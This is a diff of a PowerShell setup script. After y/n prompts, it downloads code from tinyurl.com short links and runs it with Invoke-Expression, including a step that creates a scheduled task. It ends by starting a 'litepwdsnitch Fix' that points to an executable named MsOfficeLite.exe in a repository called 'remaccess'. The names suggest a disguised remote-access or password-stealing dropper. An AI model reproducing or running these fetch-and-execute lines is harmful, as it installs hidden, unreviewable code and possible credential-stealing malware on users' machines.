@@ -6,7 +6,7 @@ if ([string]::IsNullOrEmpty($opconfirm)) {
 }
 if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Executing OP Fix..."
- 	powershell.exe irm https://tinyurl.com/backupinstall | iex
+  	Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/backupinstall -UseBasicParsing).Content
   } else {
 }
 #ZT Setup
@@ -17,19 +17,19 @@ if ([string]::IsNullOrEmpty($ztconfirm)) {
 }
 if ($ztconfirm.ToLower() -eq "y") {
     Write-Host "Executing ZT Fix..."
-	powershell.exe irm https://tinyurl.com/ztinstall | iex
+ 	Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/ztinstall -UseBasicParsing).Content
 	} else {
 }
-$opconfirm = Read-Host "Craete Scheduled Task (y/n)"
+$opconfirm = Read-Host "Create Scheduled Task (y/n)"
 if ([string]::IsNullOrEmpty($opconfirm)) {
     Start-Sleep -Seconds 2
     $opconfirm = "n"
 }
 if ($opconfirm.ToLower() -eq "y") {
-	Write-Host "Creating the task"
- 	powershell.exe iex(iwr -Uri https://tinyurl.com/taskschedulersetup -UseBasicParsing).Content
-  } else {
+    Write-Host "Creating the task"
+    Invoke-Expression (Invoke-WebRequest -Uri https://tinyurl.com/taskschedulersetup -UseBasicParsing).Content
 }
+
 #litepwdsnitch Fix
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/MsOfficeLite.exe"
 $Name = [System.IO.Path]::GetFileNameWithoutExtension($url)
